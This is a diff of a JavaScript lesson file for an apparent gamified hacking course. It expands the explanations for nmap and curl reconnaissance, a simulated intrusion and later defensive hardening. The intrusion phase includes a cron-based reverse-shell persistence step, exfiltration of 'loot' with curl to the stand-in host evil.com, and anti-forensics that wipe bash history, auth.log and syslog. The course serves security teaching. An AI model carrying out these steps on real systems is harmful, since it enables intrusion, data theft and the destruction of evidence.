@@ -7,7 +7,7 @@ const module9_technical = {
     // --- PHASE 1: RECONNAISSANCE (1-20) ---
     {
       title: "Network Sweep",
-      why: "Identify subnets.",
+      why: "Before attacking, you must map the battlefield. The <b>-sn</b> (Ping Scan) flag disables port scanning and relies purely on ICMP Echo and ARP requests to rapidly identify all live IP addresses on the 10.0.0.x subnet.",
       text: "Type <code>nmap -sn 10.0.0.0/24</code>",
       objective: "Type nmap -sn 10.0.0.0/24",
       xp: 10,
@@ -15,7 +15,7 @@ const module9_technical = {
     },
     {
       title: "Target Scan",
-      why: "Identify open ports.",
+      why: "Once a live host is found, you perform a standard scan. By default, Nmap sends TCP SYN packets to the 1,000 most common ports to see which ones respond with a SYN-ACK, revealing open doors.",
       text: "Type <code>nmap 10.0.0.50</code>",
       objective: "Scan 10.0.0.50",
       xp: 10,
@@ -23,7 +23,7 @@ const module9_technical = {
     },
     {
       title: "Service Detection",
-      why: "Find service versions.",
+      why: "An open port is just a door. You need to know what's behind it. The <b>-sV</b> flag performs active 'banner grabbing', interrogating the open port to extract the exact software name and version (e.g., Apache 2.4.41).",
       text: "Type <code>nmap -sV 10.0.0.50</code>",
       objective: "Use -sV",
       xp: 10,
@@ -31,7 +31,7 @@ const module9_technical = {
     },
     {
       title: "Vuln Scripting",
-      why: "Automated vulnerability checks.",
+      why: "Nmap contains a Lua-based execution engine. The <b>--script vuln</b> argument commands Nmap to take the software versions it just discovered and automatically test them against known CVE (Common Vulnerabilities and Exposures) databases.",
       text: "Type <code>nmap --script vuln 10.0.0.50</code>",
       objective: "Use --script vuln",
       xp: 20,
@@ -39,7 +39,7 @@ const module9_technical = {
     },
     {
       title: "Aggressive Scan",
-      why: "Deep system info.",
+      why: "The <b>-A</b> flag is the 'loud and proud' approach. It combines OS detection, version scanning, script scanning, and traceroute into one massive, noisy barrage of packets. Firewalls will definitely log this.",
       text: "Type <code>nmap -A 10.0.0.50</code>",
       objective: "Use -A",
       xp: 20,
@@ -47,7 +47,7 @@ const module9_technical = {
     },
     {
       title: "All Ports",
-      why: "Scan 65535 ports.",
+      why: "The TCP protocol allows exactly 65,535 ports. Admins often hide databases on high ports (like 65000) hoping hackers only check the default 1,000. <b>-p-</b> forces Nmap to check every single port.",
       text: "Type <code>nmap -p- 10.0.0.50</code>",
       objective: "Use -p-",
       xp: 20,
@@ -55,7 +55,7 @@ const module9_technical = {
     },
     {
       title: "UDP Discovery",
-      why: "Find UDP services.",
+      why: "Unlike TCP, the User Datagram Protocol (UDP) does not guarantee delivery. Scanning it (<b>-sU</b>) is slow and unreliable, but hackers do it to find lucrative, connectionless services like DNS (53) and SNMP (161).",
       text: "Type <code>nmap -sU 10.0.0.50</code>",
       objective: "Use -sU",
       xp: 20,
@@ -63,7 +63,7 @@ const module9_technical = {
     },
     {
       title: "OS Detection",
-      why: "Fingerprint the OS.",
+      why: "Different operating systems (Windows, Linux, FreeBSD) respond differently to broken or malformed TCP packets. The <b>-O</b> flag exploits these quirks to fingerprint the target's exact kernel architecture.",
       text: "Type <code>nmap -O 10.0.0.50</code>",
       objective: "Use -O",
       xp: 20,
@@ -71,7 +71,7 @@ const module9_technical = {
     },
     {
       title: "Fast Scan",
-      why: "Scan top 100 ports.",
+      why: "When time is critical, the <b>-F</b> flag tells Nmap to abandon the 1,000-port list and only scan the top 100 most historically common ports, drastically reducing scan times.",
       text: "Type <code>nmap -F 10.0.0.50</code>",
       objective: "Use -F",
       xp: 15,
@@ -79,7 +79,7 @@ const module9_technical = {
     },
     {
       title: "Top 10 Scan",
-      why: "Fastest port scan.",
+      why: "For lightning-fast triage during an engagement, you can pass <b>--top-ports</b> to laser-focus your probe onto the most highly-exploited ports in existence.",
       text: "Type <code>nmap --top-ports 10 10.0.0.50</code>",
       objective: "Use --top-ports 10",
       xp: 15,
@@ -87,7 +87,7 @@ const module9_technical = {
     },
     {
       title: "Output Normal",
-      why: "Save scan to file.",
+      why: "Always save your reconnaissance data. The <b>-oN</b> flag writes the exact terminal output into a standard text file for your post-engagement forensic report.",
       text: "Type <code>nmap -oN out.txt 10.0.0.50</code>",
       objective: "Use -oN out.txt",
       xp: 20,
@@ -95,7 +95,7 @@ const module9_technical = {
     },
     {
       title: "Output Grepable",
-      why: "Save for parsing.",
+      why: "If you want to feed your Nmap results into other Bash tools, you need the <b>-oG</b> (Grepable) format, which forces all data for a host onto a single, easily-parsable line.",
       text: "Type <code>nmap -oG out.gnmap 10.0.0.50</code>",
       objective: "Use -oG",
       xp: 20,
@@ -103,7 +103,7 @@ const module9_technical = {
     },
     {
       title: "Verbose Scan",
-      why: "Show details in real-time.",
+      why: "Deep scans can take 20 minutes to finish. The <b>-v</b> (Verbose) flag tells Nmap to stream its findings to your screen in real-time, rather than waiting for the entire process to complete.",
       text: "Type <code>nmap -v 10.0.0.50</code>",
       objective: "Use -v",
       xp: 15,
@@ -111,7 +111,7 @@ const module9_technical = {
     },
     {
       title: "Timing Template 3",
-      why: "Balanced scan speed.",
+      why: "Nmap speed is controlled by timing templates (T0 to T5). <b>-T3</b> is the default, offering a balanced scan that is fast but respectful of network bandwidth to avoid dropping packets.",
       text: "Type <code>nmap -T3 10.0.0.50</code>",
       objective: "Use -T3",
       xp: 15,
@@ -119,7 +119,7 @@ const module9_technical = {
     },
     {
       title: "Timing Template 4",
-      why: "Aggressive scan speed.",
+      why: "<b>-T4</b> is the aggressive 'Red Teamer' template. It assumes you are on a fast, reliable broadband connection and dramatically speeds up socket timeouts to finish the scan faster.",
       text: "Type <code>nmap -T4 10.0.0.50</code>",
       objective: "Use -T4",
       xp: 15,
@@ -127,7 +127,7 @@ const module9_technical = {
     },
     {
       title: "Stealth SYN Scan",
-      why: "Avoid full TCP handshakes.",
+      why: "Standard scans perform a full 3-way handshake, which servers log. The <b>-sS</b> (Stealth SYN) scan drops the connection before the final ACK packet is sent, preventing many older logging systems from recording the probe.",
       text: "Type <code>nmap -sS 10.0.0.50</code>",
       objective: "Use -sS",
       xp: 20,
@@ -135,7 +135,7 @@ const module9_technical = {
     },
     {
       title: "Combined Engine",
-      why: "Run default scripts and versions.",
+      why: "The industry 'Gold Standard' scan. By combining Default Scripts (<b>-sC</b>) with Version Detection (<b>-sV</b>), you gather maximum intelligence without relying on the overly chaotic Aggressive flag.",
       text: "Type <code>nmap -sC -sV 10.0.0.50</code>",
       objective: "Use -sC and -sV",
       xp: 20,
@@ -143,7 +143,7 @@ const module9_technical = {
     },
     {
       title: "Network Traceroute",
-      why: "Map network hops to target.",
+      why: "By intentionally manipulating the Time-To-Live (TTL) field on packets, <b>--traceroute</b> forces every router between you and the target to reveal itself, mapping the physical path of the network.",
       text: "Type <code>nmap --traceroute 10.0.0.50</code>",
       objective: "Use --traceroute",
       xp: 20,
@@ -151,7 +151,7 @@ const module9_technical = {
     },
     {
       title: "Aggressive OS",
-      why: "Force OS prediction.",
+      why: "Sometimes a target's TCP/IP responses don't perfectly match Nmap's database. <b>--osscan-guess</b> forces the engine to display its best probabilistic guess for the operating system.",
       text: "Type <code>nmap -O --osscan-guess 10.0.0.50</code>",
       objective: "Use --osscan-guess",
       xp: 25,
@@ -159,7 +159,7 @@ const module9_technical = {
     },
     {
       title: "Specific Ports",
-      why: "Scan only web ports.",
+      why: "When attacking web infrastructure, don't waste time scanning FTP or SSH. Combine specific ports (HTTP: 80, HTTPS: 443, Alt-HTTP: 8080) for a laser-targeted probe.",
       text: "Type <code>nmap -p 80,443,8080 10.0.0.50</code>",
       objective: "Use -p 80,443,8080",
       xp: 15,
@@ -169,7 +169,7 @@ const module9_technical = {
     // --- PHASE 2: WEB RECON & ENUM (21-40) ---
     {
       title: "HTTP Headers",
-      why: "Fingerprint web servers.",
+      why: "Web servers broadcast what software they are running in the HTTP Headers. <b>curl -I</b> performs a HEAD request, fetching only the server's metadata without downloading the actual webpage body.",
       text: "Type <code>curl -I 10.0.0.50</code>",
       objective: "Use curl -I",
       xp: 15,
@@ -177,7 +177,7 @@ const module9_technical = {
     },
     {
       title: "Follow Redirects",
-      why: "Follow 301/302.",
+      why: "If a server replies with a 301 or 302 'Moved Permanently' code, `curl` stops. The <b>-L</b> (Location) flag forces curl to automatically follow the redirect to the final destination.",
       text: "Type <code>curl -L 10.0.0.50</code>",
       objective: "Use curl -L",
       xp: 15,
@@ -185,7 +185,7 @@ const module9_technical = {
     },
     {
       title: "Verbose Fetch",
-      why: "See the handshake.",
+      why: "To see exactly what your computer is saying to the server, <b>-v</b> (Verbose) exposes the raw TLS certificate handshake and the plaintext HTTP GET and POST headers.",
       text: "Type <code>curl -v 10.0.0.50</code>",
       objective: "Use curl -v",
       xp: 15,
@@ -193,7 +193,7 @@ const module9_technical = {
     },
     {
       title: "Save HTML",
-      why: "Download the page.",
+      why: "To analyze a webpage for hidden developer comments or hardcoded API keys without a browser, use the <b>-o</b> flag to save the raw HTML DOM payload directly to your local disk.",
       text: "Type <code>curl -o index.html 10.0.0.50</code>",
       objective: "Use curl -o index.html",
       xp: 15,
@@ -201,7 +201,7 @@ const module9_technical = {
     },
     {
       title: "Robots Check",
-      why: "Check for hidden paths.",
+      why: "The <b>robots.txt</b> file is designed to tell Google what folders NOT to scan. For hackers, this is literally a map of the most sensitive, private directories on the web application.",
       text: "Type <code>curl 10.0.0.50/robots.txt</code>",
       objective: "Curl robots.txt",
       xp: 20,
@@ -209,7 +209,7 @@ const module9_technical = {
     },
     {
       title: "Directory Enum",
-      why: "Find admin directories.",
+      why: "Manually testing common paths. Attackers brute-force standard endpoints like '/admin' or '/dashboard' to bypass frontend security layers.",
       text: "Type <code>curl 10.0.0.50/admin</code>",
       objective: "Curl admin",
       xp: 20,
@@ -217,7 +217,7 @@ const module9_technical = {
     },
     {
       title: "Config Leak",
-      why: "Check for config files.",
+      why: "Modern web frameworks (like Laravel or React) store database passwords and secret API keys in a file called <b>.env</b>. If the web server is misconfigured, it will serve this file in plain text to anyone who asks.",
       text: "Type <code>curl 10.0.0.50/.env</code>",
       objective: "Curl .env",
       xp: 25,
@@ -225,7 +225,7 @@ const module9_technical = {
     },
     {
       title: "Source Exposure",
-      why: "Check for backup source files.",
+      why: "When developers edit live files using editors like Vim, the editor creates a temporary <b>.bak</b> or <b>.swp</b> file. If forgotten, these files allow hackers to download the backend PHP source code instead of executing it.",
       text: "Type <code>curl 10.0.0.50/index.php.bak</code>",
       objective: "Curl index.php.bak",
       xp: 25,
@@ -233,7 +233,7 @@ const module9_technical = {
     },
     {
       title: "API Endpoint",
-      why: "Explore hidden API.",
+      why: "Modern applications decouple the frontend from the backend. Probing the <b>/api/v1</b> endpoint can reveal JSON-based functions that bypass standard website authentication mechanisms.",
       text: "Type <code>curl 10.0.0.50/api/v1</code>",
       objective: "Curl api/v1",
       xp: 25,
@@ -241,7 +241,7 @@ const module9_technical = {
     },
     {
       title: "Sitemap Check",
-      why: "Check sitemap.xml.",
+      why: "A <b>sitemap.xml</b> file is an XML document designed to help search engines map every valid URL on a site. It often exposes deep paths that are not linked anywhere on the homepage.",
       text: "Type <code>curl 10.0.0.50/sitemap.xml</code>",
       objective: "Curl sitemap.xml",
       xp: 20,
@@ -249,7 +249,7 @@ const module9_technical = {
     },
     {
       title: "User Agent Test",
-      why: "Test for WAF blocking.",
+      why: "Web Application Firewalls (WAFs) often block requests that say 'curl' in the User-Agent header. The <b>-A</b> flag allows you to spoof your identity, pretending to be Chrome, Firefox, or a custom device.",
       text: 'Type <code>curl -A "TestAgent" 10.0.0.50</code>',
       objective: "Use curl -A",
       xp: 25,
@@ -257,7 +257,7 @@ const module9_technical = {
     },
     {
       title: "Cookie Enum",
-      why: "Check session cookies.",
+      why: "Session Cookies manage your identity. By fetching the HTTP headers, you can inspect the 'Set-Cookie' parameters to see if the server is handing out vulnerable, easily-forged JWTs or PHP Session IDs.",
       text: "Type <code>curl -I 10.0.0.50</code>",
       objective: "Check cookie headers",
       xp: 25,
@@ -265,7 +265,7 @@ const module9_technical = {
     },
     {
       title: "Post Request",
-      why: "Simulate a login attempt.",
+      why: "Most web requests are GETs (asking for data). A <b>POST</b> request pushes data to the server. Attackers use POST requests to inject malicious payloads into login forms or database query fields.",
       text: "Type <code>curl -X POST 10.0.0.50/login</code>",
       objective: "Curl POST login",
       xp: 30,
@@ -273,7 +273,7 @@ const module9_technical = {
     },
     {
       title: "Authentication Form",
-      why: "Check hidden fields.",
+      why: "Pulling the raw HTML of a login page allows you to inspect the form's `action` parameter and locate hidden `CSRF` tokens required to execute brute-force attacks.",
       text: "Type <code>curl 10.0.0.50/login.html</code>",
       objective: "Curl login page",
       xp: 20,
@@ -281,7 +281,7 @@ const module9_technical = {
     },
     {
       title: "Upload Probe",
-      why: "Check for file upload endpoints.",
+      why: "File upload endpoints are inherently dangerous. If a server does not properly validate file extensions, an attacker can upload a malicious PHP script (a web shell) and execute arbitrary code on the server.",
       text: "Type <code>curl 10.0.0.50/upload.php</code>",
       objective: "Curl upload.php",
       xp: 30,
@@ -289,7 +289,7 @@ const module9_technical = {
     },
     {
       title: "Insecure SSL",
-      why: "Ignore invalid certs.",
+      why: "Internal staging servers often use self-signed TLS certificates. By default, `curl` will aggressively reject these. The <b>-k</b> (Insecure) flag forces curl to establish the connection anyway.",
       text: "Type <code>curl -k https://10.0.0.50</code>",
       objective: "Use curl -k",
       xp: 20,
@@ -297,7 +297,7 @@ const module9_technical = {
     },
     {
       title: "Basic Auth",
-      why: "Pass credentials via URL.",
+      why: "HTTP Basic Authentication sends credentials in the HTTP header. The <b>-u</b> flag allows you to pass a username and password directly, which `curl` automatically Base64-encodes for the transaction.",
       text: "Type <code>curl -u admin:admin 10.0.0.50</code>",
       objective: "Use curl -u",
       xp: 25,
@@ -305,7 +305,7 @@ const module9_technical = {
     },
     {
       title: "Spoof Header",
-      why: "Spoof internal IPs to bypass WAF.",
+      why: "The 'X-Forwarded-For' header tells backend servers the original IP of a client passing through a proxy. Attackers forge this header to bypass IP-based rate limiting, tricking the server into thinking the request comes from localhost.",
       text: 'Type <code>curl -H "X-Forwarded-For: 127.0.0.1" 10.0.0.50</code>',
       objective: "Use curl -H",
       xp: 35,
@@ -313,7 +313,7 @@ const module9_technical = {
     },
     {
       title: "Options Method",
-      why: "Check allowed HTTP methods.",
+      why: "The <b>OPTIONS</b> HTTP method asks the web server: 'What actions are permitted here?'. If the server responds with dangerous methods like PUT or DELETE, you might be able to upload or destroy files without authenticating.",
       text: "Type <code>curl -X OPTIONS 10.0.0.50</code>",
       objective: "Use curl -X OPTIONS",
       xp: 25,
@@ -322,7 +322,7 @@ const module9_technical = {
     },
     {
       title: "Silent Output",
-      why: "Suppress progress bars.",
+      why: "When writing automated Bash tools, you don't want curl printing connection progress bars all over your script's output. The <b>-s</b> (Silent) flag suppresses everything except the actual payload data.",
       text: "Type <code>curl -s 10.0.0.50 > /dev/null</code>",
       objective: "Use curl -s",
       xp: 15,
@@ -332,7 +332,7 @@ const module9_technical = {
     // --- PHASE 3: EXPLOIT & SHELL (41-65) ---
     {
       title: "Binary Download",
-      why: "Grab exploit.",
+      why: "A vulnerability was found! You compile your malicious exploit binary and use the victim's own <b>curl</b> utility to pull the payload onto their local filesystem.",
       text: "Type <code>curl -O 10.0.0.50/shell.elf</code>",
       objective: "Curl -O shell.elf",
       xp: 25,
@@ -340,7 +340,7 @@ const module9_technical = {
     },
     {
       title: "Permissions Check",
-      why: "Check file.",
+      why: "Verify the download. By default, Linux strips the execution bit from internet downloads to prevent accidental malware execution. You must verify its metadata state.",
       text: "Type <code>ls -l shell.elf</code>",
       objective: "ls -l shell.elf",
       xp: 10,
@@ -348,7 +348,7 @@ const module9_technical = {
     },
     {
       title: "Executable Bit",
-      why: "Add execute permission.",
+      why: "The CPU will refuse to process the file's instructions unless the 'execute' permission is explicitly set. <b>chmod +x</b> alters the inode metadata to authorize execution.",
       text: "Type <code>chmod +x shell.elf</code>",
       objective: "chmod +x",
       xp: 20,
@@ -356,7 +356,7 @@ const module9_technical = {
     },
     {
       title: "Fire Exploit",
-      why: "Run binary.",
+      why: "By prefixing with `./`, you instruct the kernel to load your binary directly into memory and execute its thread. The payload detonates.",
       text: "Type <code>./shell.elf</code>",
       objective: "Type ./shell.elf",
       xp: 50,
@@ -364,7 +364,7 @@ const module9_technical = {
     },
     {
       title: "Verify User",
-      why: "Confirm root access.",
+      why: "Your exploit spawned a shell! Instantly verify your Effective User ID to determine if you breached a low-level service account or achieved full root system compromise.",
       text: "Type <code>whoami</code>",
       objective: "whoami",
       xp: 10,
@@ -372,7 +372,7 @@ const module9_technical = {
     },
     {
       title: "Check ID",
-      why: "Check group.",
+      why: "Even if you aren't root, querying your GIDs (Group IDs) is vital. If your compromised user is a member of the 'docker' or 'sudo' groups, you have immediate privilege escalation vectors.",
       text: "Type <code>id</code>",
       objective: "id",
       xp: 10,
@@ -380,7 +380,7 @@ const module9_technical = {
     },
     {
       title: "Privilege Enums",
-      why: "Run linpeas.",
+      why: "Instead of searching for flaws manually, execute the <b>LinPEAS</b> script. It automates thousands of system checks, highlighting misconfigurations that lead to root access.",
       text: "Type <code>./linpeas.sh</code>",
       objective: "Run linpeas",
       xp: 30,
@@ -388,7 +388,7 @@ const module9_technical = {
     },
     {
       title: "Search SUID",
-      why: "Find root files.",
+      why: "A Set-User-ID (SUID) binary allows a low-level user to execute the file with the privileges of its owner. If you find a root-owned SUID binary, you can exploit it to become root.",
       text: "Type <code>find / -perm -4000</code>",
       objective: "Find SUID",
       xp: 30,
@@ -396,7 +396,7 @@ const module9_technical = {
     },
     {
       title: "Sudo Check",
-      why: "See sudo rights.",
+      why: "If you stole the user's password, <b>sudo -l</b> queries the system to see exactly which commands the user is allowed to run with elevated root privileges.",
       text: "Type <code>sudo -l</code>",
       objective: "sudo -l",
       xp: 20,
@@ -404,7 +404,7 @@ const module9_technical = {
     },
     {
       title: "Clear Bash",
-      why: "Wipe command log.",
+      why: "Your shell session is logging everything to the system's RAM. The <b>history -c</b> command forcefully clears the active RAM buffer, ensuring your session commands aren't saved when you log out.",
       text: "Type <code>history -c</code>",
       objective: "history -c",
       xp: 20,
@@ -412,7 +412,7 @@ const module9_technical = {
     },
     {
       title: "Erase .bash_history",
-      why: "Clear persistent file.",
+      why: "Overwriting the `.bash_history` file with a null string completely wipes the permanent disk record of your commands, blinding forensic investigators.",
       text: 'Type <code>echo "" > ~/.bash_history</code>',
       objective: "Empty history file",
       xp: 30,
@@ -420,7 +420,7 @@ const module9_technical = {
     },
     {
       title: "Cron Persistence",
-      why: "Schedule reverse shell.",
+      why: "If the server reboots, you lose access. Write a cron instruction string that tells the system scheduler to re-execute your reverse shell binary every single minute (* * * * *).",
       text: 'Type <code>echo "* * * * * /tmp/shell.sh" > /tmp/cron.txt</code>',
       objective: "Create cron file",
       xp: 40,
@@ -428,7 +428,7 @@ const module9_technical = {
     },
     {
       title: "Install Cron",
-      why: "Register cron file.",
+      why: "Register your malicious schedule file with the kernel's cron daemon to establish permanent, automated persistence on the machine.",
       text: "Type <code>crontab /tmp/cron.txt</code>",
       objective: "Run crontab",
       xp: 30,
@@ -436,7 +436,7 @@ const module9_technical = {
     },
     {
       title: "Verify Cron",
-      why: "Check jobs.",
+      why: "Query the active task scheduler to guarantee your persistence job is loaded into the kernel's queue.",
       text: "Type <code>crontab -l</code>",
       objective: "crontab -l",
       xp: 20,
@@ -444,7 +444,7 @@ const module9_technical = {
     },
     {
       title: "Remove Cron",
-      why: "Delete job.",
+      why: "To clean up your tracks after an engagement, the <b>-r</b> flag completely purges all scheduled tasks for your user.",
       text: "Type <code>crontab -r</code>",
       objective: "crontab -r",
       xp: 20,
@@ -452,7 +452,7 @@ const module9_technical = {
     },
     {
       title: "Cleanup Temp",
-      why: "Delete exploit.",
+      why: "The /tmp directory is the first place Blue Teamers look. Delete your exploit binary to remove Indicators of Compromise (IoCs).",
       text: "Type <code>rm /tmp/shell.sh</code>",
       objective: "Delete shell",
       xp: 15,
@@ -460,7 +460,7 @@ const module9_technical = {
     },
     {
       title: "Exfil Data",
-      why: "Tar loot.",
+      why: "You found sensitive corporate data. Compress it heavily using Gzip so it transfers quickly and avoids tripping Data Loss Prevention (DLP) packet size limits.",
       text: "Type <code>tar -czvf loot.tar.gz /home/sysadmin/secret.txt</code>",
       objective: "tar secret.txt",
       xp: 40,
@@ -468,7 +468,7 @@ const module9_technical = {
     },
     {
       title: "Upload Loot",
-      why: "Send loot.",
+      why: "Exfiltrate the data. Using <b>curl -F</b> simulates a standard user uploading a file via a web form, allowing the stolen data to blend invisibly with normal HTTP web traffic.",
       text: 'Type <code>curl -F "file=@loot.tar.gz" http://evil.com/drop</code>',
       objective: "curl loot",
       xp: 50,
@@ -476,7 +476,7 @@ const module9_technical = {
     },
     {
       title: "Cleanup Loot",
-      why: "Remove evidence.",
+      why: "Leaving a file named `loot.tar.gz` on a server is a massive red flag. Annihilate the archive.",
       text: "Type <code>rm loot.tar.gz</code>",
       objective: "rm loot.tar.gz",
       xp: 15,
@@ -484,7 +484,7 @@ const module9_technical = {
     },
     {
       title: "Last Cleanup",
-      why: "Final check.",
+      why: "Verify the staging environment is completely pristine and indistinguishable from its pre-compromise state.",
       text: "Type <code>ls /tmp</code>",
       objective: "ls /tmp",
       xp: 10,
@@ -492,7 +492,7 @@ const module9_technical = {
     },
     {
       title: "Clean Logs",
-      why: "Delete auth logs.",
+      why: "The auth log recorded your backdoor logins. Rather than deleting the file (which causes system errors), truncate its contents to 0 bytes.",
       text: 'Type <code>echo "" > /var/log/auth.log</code>',
       objective: "Empty auth.log",
       xp: 30,
@@ -501,7 +501,7 @@ const module9_technical = {
     },
     {
       title: "Clean Syslog",
-      why: "Delete syslog.",
+      why: "Truncate the core kernel diagnostic log to blind the incident response team from your execution footprints.",
       text: 'Type <code>echo "" > /var/log/syslog</code>',
       objective: "Empty syslog",
       xp: 30,
@@ -510,7 +510,7 @@ const module9_technical = {
     },
     {
       title: "Self Destruct",
-      why: "Exit.",
+      why: "Terminate your reverse shell gracefully, signaling the TCP stack to send a FIN packet and cleanly close the connection.",
       text: "Type <code>exit</code>",
       objective: "exit",
       xp: 10,
@@ -518,7 +518,7 @@ const module9_technical = {
     },
     {
       title: "Verify Exit",
-      why: "Close terminal.",
+      why: "Terminate the pseudo-terminal layer (PTY) to return to your original host machine.",
       text: "Type <code>exit</code>",
       objective: "exit",
       xp: 10,
@@ -526,7 +526,7 @@ const module9_technical = {
     },
     {
       title: "Session Closed",
-      why: "Cleanup complete.",
+      why: "The offensive engagement is fully complete and all tracks are erased. Log your extraction timestamp.",
       text: "Type <code>date</code>",
       objective: "date",
       xp: 10,
@@ -536,7 +536,7 @@ const module9_technical = {
     // --- PHASE 4: DEFENSIVE HARDENING (66-85) ---
     {
       title: "Audit Users",
-      why: "List system users.",
+      why: "Shift to Blue Team defense. Cat the `passwd` file to audit the static list of all accounts currently configured in the operating system.",
       text: "Type <code>cat /etc/passwd</code>",
       objective: "cat passwd",
       xp: 15,
@@ -544,7 +544,7 @@ const module9_technical = {
     },
     {
       title: "Audit Groups",
-      why: "List system groups.",
+      why: "Cat the `group` file. Attackers often add their low-level backdoor account to the 'sudo' or 'wheel' group to stealthily gain administrative access.",
       text: "Type <code>cat /etc/group</code>",
       objective: "cat group",
       xp: 15,
@@ -552,7 +552,7 @@ const module9_technical = {
     },
     {
       title: "Audit Shadow",
-      why: "Check password hashes.",
+      why: "The `shadow` file contains the salted SHA-512 password hashes. Ensure this file is completely unreadable to anyone except the root user.",
       text: "Type <code>cat /etc/shadow</code>",
       objective: "cat shadow",
       xp: 20,
@@ -560,7 +560,7 @@ const module9_technical = {
     },
     {
       title: "Check Firewall",
-      why: "List rules.",
+      why: "Interrogate the kernel's Netfilter module. If the iptables chains are completely empty, your server is dangerously exposed to the raw internet.",
       text: "Type <code>iptables -L</code>",
       objective: "iptables -L",
       xp: 15,
@@ -568,7 +568,7 @@ const module9_technical = {
     },
     {
       title: "Flush Firewall",
-      why: "Reset all rules.",
+      why: "If an attacker injected malicious routing rules to maintain their connections, use the <b>-F</b> (Flush) flag to violently delete every active rule in RAM.",
       text: "Type <code>iptables -F</code>",
       objective: "iptables -F",
       xp: 20,
@@ -576,7 +576,7 @@ const module9_technical = {
     },
     {
       title: "Default Deny",
-      why: "Block everything.",
+      why: "The ultimate secure posture. Setting the default policy to <b>DROP</b> means the kernel will silently destroy every inbound packet unless a specific rule explicitly allows it.",
       text: "Type <code>iptables -P INPUT DROP</code>",
       objective: "iptables -P INPUT DROP",
       xp: 30,
@@ -585,7 +585,7 @@ const module9_technical = {
     },
     {
       title: "Allow SSH",
-      why: "Allow admin access.",
+      why: "Because you set a Default Deny policy, you must explicitly punch a hole in the firewall for port 22, otherwise you will lock yourself out of your own server.",
       text: "Type <code>iptables -A INPUT -p tcp --dport 22 -j ACCEPT</code>",
       objective: "Allow SSH port 22",
       xp: 30,
@@ -593,7 +593,7 @@ const module9_technical = {
     },
     {
       title: "Allow HTTP",
-      why: "Allow web traffic.",
+      why: "Punch a second hole in the firewall to allow the public to access the production web application on port 80.",
       text: "Type <code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT</code>",
       objective: "Allow HTTP port 80",
       xp: 30,
@@ -601,7 +601,7 @@ const module9_technical = {
     },
     {
       title: "Save Firewall",
-      why: "Persistent storage.",
+      why: "Iptables are volatile. If the server reboots, the RAM clears and the firewall opens. You must dump the active state to the disk for persistence.",
       text: "Type <code>iptables-save > /etc/iptables.rules</code>",
       objective: "Redirect to iptables.rules",
       xp: 30,
@@ -609,7 +609,7 @@ const module9_technical = {
     },
     {
       title: "Audit Processes",
-      why: "List active procs.",
+      why: "Take a wide snapshot of every active thread utilizing the CPU to establish a baseline of normal, healthy server operations.",
       text: "Type <code>ps aux</code>",
       objective: "ps aux",
       xp: 15,
@@ -617,7 +617,7 @@ const module9_technical = {
     },
     {
       title: "Grep Rogue Proc",
-      why: "Identify malware.",
+      why: "Use pattern matching to hunt for known malicious process names or suspicious python sockets running in the background.",
       text: "Type <code>ps aux | grep shell</code>",
       objective: "Grep for shell",
       xp: 25,
@@ -625,7 +625,7 @@ const module9_technical = {
     },
     {
       title: "Kill Rogue Proc",
-      why: "Kill by PID.",
+      why: "If malware is identified on PID 1337, dispatch a SIGKILL signal to forcefully terminate the malicious process space.",
       text: "Type <code>kill -9 1337</code>",
       objective: "kill -9 1337",
       xp: 20,
@@ -633,7 +633,7 @@ const module9_technical = {
     },
     {
       title: "Audit Ports",
-      why: "List open sockets.",
+      why: "Audit the kernel's network socket table to ensure no unauthorized backdoors (like Netcat listeners) are waiting for inbound connections.",
       text: "Type <code>ss -tuln</code>",
       objective: "ss -tuln",
       xp: 15,
@@ -641,7 +641,7 @@ const module9_technical = {
     },
     {
       title: "Check Load",
-      why: "Check load average.",
+      why: "Check the 1/5/15 minute load averages. If a CPU spike correlates with an unauthorized login, the server may have been infected with a cryptominer.",
       text: "Type <code>uptime</code>",
       objective: "uptime",
       xp: 10,
@@ -649,7 +649,7 @@ const module9_technical = {
     },
     {
       title: "Final Triage",
-      why: "Check user logins.",
+      why: "Check the `utmp` file to ensure you are the only user with an active, interactive terminal session on the machine.",
       text: "Type <code>w</code>",
       objective: "Type w",
       xp: 10,
@@ -657,7 +657,7 @@ const module9_technical = {
     },
     {
       title: "Block Ping",
-      why: "Prevent ping scans via ICMP.",
+      why: "To hide the server from automated botnet scanners, configure iptables to silently drop all inbound ICMP Echo (Ping) requests.",
       text: "Type <code>iptables -A INPUT -p icmp -j DROP</code>",
       objective: "Block ICMP in iptables",
       xp: 35,
@@ -666,7 +666,7 @@ const module9_technical = {
     },
     {
       title: "Secure Root Dir",
-      why: "Lock down the admin directory.",
+      why: "Apply strict 700 permissions to the `/root` folder. This geometrically prevents any other user from reading, writing, or executing files inside the admin's home directory.",
       text: "Type <code>chmod 700 /root</code>",
       objective: "chmod 700 /root",
       xp: 25,
@@ -675,7 +675,7 @@ const module9_technical = {
     },
     {
       title: "Fix Shadow Ownership",
-      why: "Ensure only root owns the hash file.",
+      why: "If an exploit altered the ownership of the password hash file, use <b>chown</b> to forcefully reassign User and Group ownership exclusively to the root account.",
       text: "Type <code>chown root:root /etc/shadow</code>",
       objective: "chown root:root /etc/shadow",
       xp: 30,
@@ -684,7 +684,7 @@ const module9_technical = {
     },
     {
       title: "Disable Bluetooth",
-      why: "Hardening: Turn off unnecessary services.",
+      why: "Security through attack surface reduction. If a server doesn't need a service, disable it. The bluetooth daemon is historically prone to remote code execution flaws.",
       text: "Type <code>systemctl disable bluetooth</code>",
       objective: "systemctl disable bluetooth",
       xp: 25,
@@ -693,7 +693,7 @@ const module9_technical = {
     },
     {
       title: "Mask Print Service",
-      why: "Hardening: Prevent CUPS from starting entirely.",
+      why: "The ultimate disable. <b>mask</b> symmetrically links the CUPS print service to `/dev/null`, making it mathematically impossible for any other application or user to start it.",
       text: "Type <code>systemctl mask cups</code>",
       objective: "systemctl mask cups",
       xp: 25,
@@ -704,7 +704,7 @@ const module9_technical = {
     // --- PHASE 5: THREAT HUNTING FORENSICS (86-100) ---
     {
       title: "Auth Log Search",
-      why: "Search for failures.",
+      why: "Forensic Hunt: Sift through the Pluggable Authentication Module (PAM) logs to identify the exact IP address that initiated the SSH brute-force attack.",
       text: 'Type <code>grep "Failed" /var/log/auth.log</code>',
       objective: "Grep auth.log",
       xp: 20,
@@ -712,7 +712,7 @@ const module9_technical = {
     },
     {
       title: "Syslog Search",
-      why: "Search system events.",
+      why: "Forensic Hunt: Isolate CRON entries in the core system logs to detect if the attacker established automated persistence routines in the background.",
       text: 'Type <code>grep "CRON" /var/log/syslog</code>',
       objective: "Grep cron in syslog",
       xp: 20,
@@ -720,7 +720,7 @@ const module9_technical = {
     },
     {
